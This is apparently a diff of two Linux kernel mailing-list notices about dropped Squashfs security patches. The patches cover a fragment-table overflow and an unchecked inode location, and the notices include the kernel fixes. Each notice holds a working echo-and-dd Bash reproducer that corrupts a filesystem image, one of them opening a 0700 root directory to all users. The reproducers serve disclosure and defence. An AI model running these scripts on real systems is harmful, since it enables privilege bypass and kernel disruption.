@@ -1,49 +1,49 @@
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1795406621;
-	b=HOa3Fky7vRz2YUdILtYkp4ccjxJr1jPy/yIwmJQLqYCrvKHeKIzAwEszGPFu68gvTeGP
-	 adSjNoGnFFiz2P2a6quJEsYl/sewmRe1zEl3PeGFGIgBqIRBhPmlbYi+/KlYWlDW3TI6Q
-	 iNte0rSRh8RCqT2jRh3kx+9OQplXsgC+b2Gn/vSBBIYm8W5WGwPblIkYCBY1Ts0DJ7VwR
-	 lrlP1YpnE/2HML7RZM04Ant4cL8A3dsu3BK+bX9EO7rQzIK2g+9VbU+u96ZY1HS0ZpzF0
-	 pKNPYFhdPs/rwSG7Rw975JRwu0POTRgcYfgnrtzN5tXou12T2CRoLdbbyQe6TJaSrsg==
+	t=1795406623;
+	b=4r9GGKFNQjzQul8knqq8AmOoww+mJ80cHQ7vUq1E6LpMdM2HliwjlRwDMrhdGRGNmTRQ
+	 DG0AzrgzW7VhUcfJ48nC1O8NGY8jRZXk3BY3SJTv1ELwzVYzz9MLTiwxPepHGjkZJb0Y8
+	 8I+V72b5lfw/UjdIXSnKPdjbsrjwwqPCgCERFig3D+eDy6UAmRP1bp0JPpvhiYPoQ4Hop
+	 xgoLrKSR0dhaRE++3bOJ+63Hhv3PoVP6ezuYPMSwokmHTgph/c2aMqHkj6gEea1xlwasz
+	 X2FZp9ZJ+coITPIDj93vPHG9im2ZKhgpDJwSKU255m+LzZdkSfbaGgvT6Aoykmm7cuw==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1795406621;
+	a=rsa-sha256; c=relaxed/relaxed; t=1795406623;
 	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
 	 Message-Id;
-	bh=RiTeqolQgf7Rm/R4pRzpc3gu1/kDItgalarWoQRcWS0=;
-	b=VdC2kplaA7wSFUUhFiKVD/lWEvyYppV4bkL3hRo9gMAIanaA8A+CDdM8UieXtd2AwcTb
-	 xDQ6EtCWPFLSnFhaKDnwti3gpPf3QBoUr1wbwo3abEi+oInO752D9Qt3TtIcmfsYEO61s
-	 RSnUa2FOYHzc3qJ0w0LgY2RwLGvMjHwbLL8gk1T5WaTl3x0jpYUuS9jPWF0oYp5qVuTYS
-	 3IyZwc6V1pRQXb7yb/YUkxOdQ5o5mvUTiYHwnunpAbinxudpvJq/2vvM7vrsYxjdc4C7O
-	 Ik6ET0z1F6bQnKcPFoVoacPWG0Z+yEZbIYIF1LOVhOzhCp6hCc6YkGIPvBak6RKBZnw==
+	bh=awOmGwonrevMnIjs+oBQ6X6IHqwYch40EDXF71wv7Y0=;
+	b=OGg7/U7X5WEk6lR+u4L3KYbx9Q8W9ISKAZaou8ZH90k96Do/HPNyqQoylsBdkGZkPl1d
+	 orG353IBUGhBabv83Q4PCAVjZrYnkYtacVdbnJuQtLtPRZfMIBxvFbxeQsNXFU2+jz/C6
+	 Ml5CncO5ZWZ2F2FPeHe75YJr/3Jjz4fntIKN+Zfi4PUQM1VU7XVr+wf87GtxKg+jOqHYe
+	 vNdsTIyh/vk/PUQl9aAw4JvoJok4zPskIwQFODU4oiozZ9bpBxFAKkQe1Pttk40cI/v1q
+	 1BrUlLn5T+NWKJcvSqTng2tJzmvQEQXBRD4Zq+TpHeYOPbqrII4nj69gqOh2IYkUmDg==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b="FXQb/TA0";
+	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Ymje4Iac;
 	arc=none smtp.remote-ip=100.103.45.18
 Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 610FD606A31A
-	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:03:41 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3F5F8606A31E
+	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:03:42 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=FXQb/TA0
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id A78081F000C0;
-	Mon, 23 Nov 2026 04:03:40 +0000 (UTC)
+	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=Ymje4Iac
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 6050C1F000D4;
+	Mon, 23 Nov 2026 04:03:42 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-	d=linux-foundation.org; s=korg; t=1795406620;
-	bh=RiTeqolQgf7Rm/R4pRzpc3gu1/kDItgalarWoQRcWS0=;
+	d=linux-foundation.org; s=korg; t=1795406622;
+	bh=awOmGwonrevMnIjs+oBQ6X6IHqwYch40EDXF71wv7Y0=;
 	h=Date:To:From:In-Reply-To:References:Subject;
-	b=FXQb/TA08aEFGY347wkwMcDYmVPwDFUFrkXvPIC8Jb51199Fe2LFEFqNcNEYfJ0mE
-	 vUhan+Kc67PLTDgn7ynft00KpvpVy2Ba0Ze/IDyEYOB3862uy4dj2VknzQTu/EQT0Y
-	 PqJO+t+Qi9vo8MKimcvXRfzoD3B6stLff8BJQyL8=
-Date: Sun, 22 Nov 2026 20:03:40 -0800
+	b=Ymje4IacgeOpgcbnXR7w3m4QM/tZWT3QQrnP7gxQhVv5AiY5ds013CXRBcwtScINg
+	 +0QwHWmrhvP4DRhvlnWp20SbHFURguzeKuA2laz7Uhejm86PikFy5XIvHqKTP8uRVD
+	 piIQC8AUWkS7pXjCZX6qEkCkcu3K+oP24HV175Oc=
+Date: Sun, 22 Nov 2026 20:03:41 -0800
 To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
 	akpm@linux-foundation.org
 From: Andrew Morton <akpm@linux-foundation.org>
-In-Reply-To: <20261111234402.252354-10-phillip@squashfs.org.uk>
-References: <20261111234402.252354-10-phillip@squashfs.org.uk>
-Subject: [to-be-updated] squashfs-fix-fragment-index-table-length-too-large-exploit.patch removed from -mm tree
-Message-Id: <20261123040340.A78081F000C0@smtp.kernel.org>
+In-Reply-To: <20261111234402.252354-11-phillip@squashfs.org.uk>
+References: <20261111234402.252354-11-phillip@squashfs.org.uk>
+Subject: [to-be-updated] squashfs-sanity-check-inode-metadata-block-location.patch removed from -mm tree
+Message-Id: <20261123040342.6050C1F000D4@smtp.kernel.org>
 X-Mailing-List: mm-commits@vger.kernel.org
 List-Id: <mm-commits.vger.kernel.org>
 List-Post: <mailto:mm-commits@vger.kernel.org>
@@ -55,74 +55,68 @@ Precedence: list
 
 
 The quilt patch titled
-     Subject: Squashfs: fix fragment index table length too large exploit
+     Subject: Squashfs: sanity check inode metadata block location
 has been removed from the -mm tree.  Its filename was
-     squashfs-fix-fragment-index-table-length-too-large-exploit.patch
+     squashfs-sanity-check-inode-metadata-block-location.patch
 
 This patch was dropped because an updated version will be issued
 
 ------------------------------------------------------
 From: Phillip Lougher <phillip@squashfs.org.uk>
-Subject: Squashfs: fix fragment index table length too large exploit
-Date: Wed, 11 Nov 2026 23:43:49 +0000
+Subject: Squashfs: sanity check inode metadata block location
+Date: Wed, 11 Nov 2026 23:43:50 +0000
 
-An attacker can manipulate the fragment count and the fragment table
-start values in the superblock, and force the code to kmalloc()
-a 4 Mbyte memory region, or try to allocate larger values which
-will fail with a warning, and which will panic the kernel if panic on
-warn is set.
+An inode reference in Squashfs is represented as a tuple, the location
+of the compressed metadata block the inode is in, and the offset into
+the uncompressed block.  The location is not absolute and it is instead
+encoded as an offset from the start of the inode table.
 
-If the allocation succeeds, these invalid values will be caught when the
-code tries to read the data from disk, but, this leaves a small time
-window where the 4 Mbyte block is allocated before being freed when
-the mount of the filesystem fails.
+An attacker could manipulate the inode reference to make it point to a
+replacement malicious inode stored elsewhere, outside the inode table.
+This is because the code does not check that the location is valid and
+is within the inode table.
 
-The exploit relies on arithmetic overflow to evade the following sanity
-check:
+In practice this exploit is hard to achieve because metadata in Squashfs
+is compressed by default, and so the compressed metadata cannot be
+directly altered.  In addition due to sanity checking at mount time
+there are no gaps in the filesystem to hide a malicious inode.
 
-	if (fragment_table_start + length > next_table)
+Also anyone with access to Mksquahfs/Unsquashfs can copy and recreate
+the filesystem incorporating whatever changes they want.
 
-Specifically, the values of fragment_table_start and length can be
-chosen so that they overflow an unsigned long long, and so appear less
-than next_table.
+However there are a number of exploit scenarios here.  Many embedded
+systems or secure systems have deliberately restricted installations
+with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
+due to this bug can be achieved with only echo and dd.
 
-Typically, the maximum memory that can be allocated with kmalloc() is
-4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
-needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
-length.
+An example exploit is where a Squashfs filesystem root directory has
+permissions 0700 (u=rxw), where only the superuser can enter the
+directory and access the content within. But using this bug an attacker
+could place a malicious root inode in the inode lookup table (used by
+NFS) which has the permissions changed to 0777 (a=rwx), and then update
+the root_inode field in the superblock to point to that.  On
+reboot/remount this will make the directory accesisible to unprivileged
+users.
 
-This value is beyond the end of any block device, because the maximum
-block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
-bytes).
+The following shell script acts as a reproducer and proof of concept.
 
-In practice this means such a large value will be caught when the code
-immediately after allocation tries to read the data off disk:
-
- 	table = squashfs_read_table(sb, fragment_table_start, length);
-
-However, the code should check for validity before allocating a large
-kmalloc() area, because such allocations can cause memory pressure or
-cause the kernel to panic.
-
-This commit checks that fragment_tables_size is not too large, and
-ensures arithmetic overflow does not occur.
-
-It also makes the sanity check more exacting by utilising the fact that
-there should be zero gap between the end of the fragment index table and
-the next table.
+This commit blocks such attempts by adding a new helper
+squashfs_inode_start() which adds additional sanity checking, first
+ensuring no arithmetic operations overflow, and second checking that
+the inode is within the inode table.
 
 Reproducer
-=========
+==========
 
-The following script if the eploit works, will fail with the mount
-error
+The following Bash script uses echo and dd to achieve the previously
+discussed exploit.  If the exploit is successful the root directory
+permisions will be changed to 0777 (a=rwx), but otherwise the filesystem
+is unchanged.
 
-mount: attempt to access beyond end of device
-
-=================================================================
+======================================================================
 #!/bin/bash
 
-ARGS="-quiet -no-progress"
+ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"
 
 finish() {
 	popd 2>&1 > /dev/null
@@ -130,99 +124,166 @@ finish() {
 	exit 1
 }
 
-# Create a Squashfs filesystem with a single file.
-#
 DIR=$(mktemp -d)
 
 pushd $DIR 2>&1 > /dev/null
 
-echo Create the Squashfs filesystem
+# Create a Squashfs pseudo file which is fed to Mksquashfs
+echo Create a Squashfs pseudo file which is fed to Mksquashfs
 
-if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
+dd if=/dev/zero of=zero bs=1024 count=1 status=none
+for i in $(seq 1 100); do
+	echo "$i l zero" >> pseudo
+done
+
+# Create a Squashfs filesystem with the root directory permissions u=rwx (0700)
+echo "Create a Squashfs filesystem with the root directory permissions u=rwx (0700)"
+
+if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0700 0 0" $ARGS; then
 	echo Failed to create Squashfs filesystem
 	finish
-
 fi
 
-# The fragments field (fragment count) in the superblock is at offset
-# 16 bytes.
+# The root_inode field in the superblock points to the compressed metadata
+# block and offset within it, where the root inode is stored.
 #
-# Over-write the fragments count with 268,435,456 little-endian.
-# This will make the kernel try to kmalloc() 4 Mbytes to hold the
-# fragment index table.
+# Create a malicious root inode and hide it in the inode lookup table.
+# Because of mount time checking, there are no gaps between metadata tables
+# where it can be hidden, and it can't be hidden after the file system end,
+# because this is checked.
+
+# Write malicious inode, this is the same as the original root inode, except
+# it is uncompressed, and the permissions are set to 0777.
+/usr/bin/echo -en "\x20\x80\x01\x00\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\
+\x65\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\xec\x03\x00\x00\x00\x00\x00\
+\x00" > file
+
+# Place new root inode inside the inode lookup table
+echo Place new root inode inside the inode lookup table
+
+dd bs=1 seek=960 if=file of=img.sqsh count=34 conv=notrunc status=none
+
+# Update the root_inode field in the superblock to point to our new inode
+# The start block is an offset from the inode_table_start, and not an
+# absolute value.  The start of the inode table is 113, the new inode
+# is placed at position 964, and so the offset is 851. Because we've only
+# stored one inode in the metadata block, the offset into that block is 0.
 #
+echo Update the root_inode field in the superblock to point to our new inode
 
-# Write 268,435,456 in little-endian format to file
-/usr/bin/echo -en "\x00\x00\x00\x10" > file
+/usr/bin/echo -en "\x00\x00\x4f\x03" > file
 
-# Over-write the fragments count in the superblock
-echo Over-write the fragments count in the superblock
-
-dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none
-
-# The fragment table start (start of the index table) in the superblock
-# is at offset 72 bytes.
-#
-# Over-write the value with 2^64 - 4 Mbytes little-endian.
-# This value with the index table length will overflow an unsigned
-# long long, giving the value 0.  This will evade the sanity check.
-
-# Write 2^64 - 4 Mbytes in little-endian format to file
-/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file
-
-# Over-write the fragment table start in the superblock
-echo Over-write the fragment table start in the superblock
-
-dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none
+dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none
 
 # Mount the filesystem to /mnt
 echo Mount the filesystem to /mnt
-
-# If the eploit works, the mount will fail with
-# mount: attempt to access beyond end of device
 
 if ! mount -t squashfs img.sqsh /mnt; then
 	echo Mount of Squashfs filesystem failed
 	finish
 fi
 
-popd 2>&1 > /dev/null
+# Stat /mnt, if the exploit is successful, permissions should be 0777
+echo Stat /mnt, if the exploit is successful, permissions should be 0777
+
+stat /mnt
+
+popd 2>&1> /dev/null
 
 rm -rf $DIR
-=================================================================
+======================================================================
 
-Link: https://patch.msgid.link/20261111234402.252354-10-phillip@squashfs.org.uk
-Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
+Link: https://patch.msgid.link/20261111234402.252354-11-phillip@squashfs.org.uk
+Fixes: 6545b246a2c8 ("Squashfs: inode operations")
 Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
 Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
 Cc: Phillip Lougher <phillip.lougher@gmail.com>
 
- fs/squashfs/fragment.c |    8 ++++----
- 1 file changed, 4 insertions(+), 4 deletions(-)
+ fs/squashfs/inode.c            |   17 ++++++++++-------
+ fs/squashfs/squashfs_helpers.h |   18 ++++++++++++++++++
+ 2 files changed, 28 insertions(+), 7 deletions(-)
 
---- a/fs/squashfs/fragment.c~squashfs-fix-fragment-index-table-length-too-large-exploit
-+++ a/fs/squashfs/fragment.c
-@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_tab
- 	__le64 *table;
+--- a/fs/squashfs/inode.c~squashfs-sanity-check-inode-metadata-block-location
++++ a/fs/squashfs/inode.c
+@@ -109,8 +109,8 @@ int squashfs_read_inode(struct inode *in
+ {
+ 	struct super_block *sb = inode->i_sb;
+ 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+-	u64 block = squashfs_inode_blk(ino) + msblk->inode_table;
+-	int offset = squashfs_inode_offset(ino);
++	s64 block = squashfs_inode_start(msblk, ino), sblock = block;
++	int offset = squashfs_inode_offset(ino), soffset = offset;
+ 	int err, type;
+ 	union squashfs_inode squashfs_ino;
+ 	struct squashfs_base_inode *sqshb_ino = &squashfs_ino.base;
+@@ -118,11 +118,14 @@ int squashfs_read_inode(struct inode *in
  
+ 	TRACE("Entered squashfs_read_inode\n");
+ 
++	if (block < 0)
++		goto bad_block_val;
++
  	/*
--	 * Sanity check, length bytes should not extend into the next table -
--	 * this check also traps instances where fragment_table_start is
--	 * incorrectly larger than the next table start
-+	 * The computed size of the index table (length bytes) should exactly
-+	 * match the table start and end points
+ 	 * Read inode base common to all inode types.
  	 */
--	if (fragment_table_start + length > next_table)
-+	if (fragment_table_start >= next_table ||
-+				length != (next_table - fragment_table_start))
- 		return ERR_PTR(-EINVAL);
+-	err = squashfs_read_metadata(sb, sqshb_ino, &block,
+-				&offset, sizeof(*sqshb_ino));
++	err = squashfs_read_metadata(sb, sqshb_ino, &sblock,
++				&soffset, sizeof(*sqshb_ino));
+ 	if (err < 0)
+ 		goto failed_read;
  
- 	table = squashfs_read_table(sb, fragment_table_start, length);
+@@ -130,9 +133,6 @@ int squashfs_read_inode(struct inode *in
+ 	if (err)
+ 		goto failed_read;
+ 
+-	block = squashfs_inode_blk(ino) + msblk->inode_table;
+-	offset = squashfs_inode_offset(ino);
+-
+ 	type = le16_to_cpu(sqshb_ino->inode_type);
+ 	switch (type) {
+ 	case SQUASHFS_REG_TYPE: {
+@@ -452,6 +452,9 @@ int squashfs_read_inode(struct inode *in
+ 
+ 	return 0;
+ 
++bad_block_val:
++	err = block;
++
+ failed_read:
+ 	ERROR("Unable to read inode 0x%llx\n", ino);
+ 	return err;
+--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-inode-metadata-block-location
++++ a/fs/squashfs/squashfs_helpers.h
+@@ -47,6 +47,24 @@ static inline u16 squashfs_inode_offset(
+ 	return inode & 0xffff;
+ }
+ 
++static inline s64 squashfs_inode_start(struct squashfs_sb_info *msblk, s64 inode)
++{
++	s64 start;
++
++	if (inode < 0)
++		return -EINVAL;
++
++	if (S64_MAX - msblk->inode_table < squashfs_inode_blk(inode))
++		return -EINVAL;
++
++	start = msblk->inode_table + squashfs_inode_blk(inode);
++
++	if (start > msblk->directory_table)
++		return -EINVAL;
++
++	return start;
++}
++
+ static inline s64 squashfs_mkinode(u32 start, u16 offset)
+ {
+ 	return ((s64)start << 16) | offset;
 _
 
 Patches currently in -mm which might be from phillip@squashfs.org.uk are
 
-squashfs-sanity-check-inode-metadata-block-location.patch
 squashfs-sanity-check-directory-metadata-block-location.patch
 squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
 squashfs-very-large-files-can-exceed-an-int-block-count.patch
